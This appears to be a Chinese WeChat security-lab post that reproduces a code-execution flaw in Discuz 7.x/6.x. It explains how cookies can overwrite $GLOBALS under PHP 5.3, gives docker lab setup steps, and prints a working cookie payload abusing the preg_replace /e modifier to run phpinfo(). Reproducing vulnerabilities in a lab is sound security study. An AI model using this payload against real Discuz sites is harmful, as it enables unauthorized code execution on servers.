#  Discuz 7.x/6.x 全局变量防御绕过导致代码执行

巢安实验室  [ 巢安实验室 ](javascript:void\(0\);)

**巢安实验室** ![]()

微信号 safe-labs

功能介绍 为荣誉而战，为的是那份自己不屈服于任何人，踢踏是脚下的尊严。

____

___发表于_

收录于合集 #漏洞复现 121个

**漏洞简介**

由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。

 **原理分析**

  * 

    
    
     https://www.secpulse.com/archives/2338.html

 **环境搭建**

执行以下命令启动Discuz 7：

    
    
    docker-compose up -d  
    

启动后，访问http://your-ip:8080/install来安装discuz

如下为安装步骤：  

![]()直接下一步：

![]()

数据库地址填写db，数据库名为discuz，数据库账号密码均为root。  

![]()

进入界面：  

![]()  

 **漏洞复现**

安装成功后，随便在里面找一个已存在的帖子

  * 

    
    
    http://192.168.137.145:8080/viewthread.php?tid=1

![]()

向其发送数据包，并在Cookie中增加

  * 

    
    
    GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

![]()

![]()

![]()

  

 **本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

 **  
**

 **由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。 **公众号**
内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

 **  
**

 **敲敲小黑板：《刑法》第二百八十五条
【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

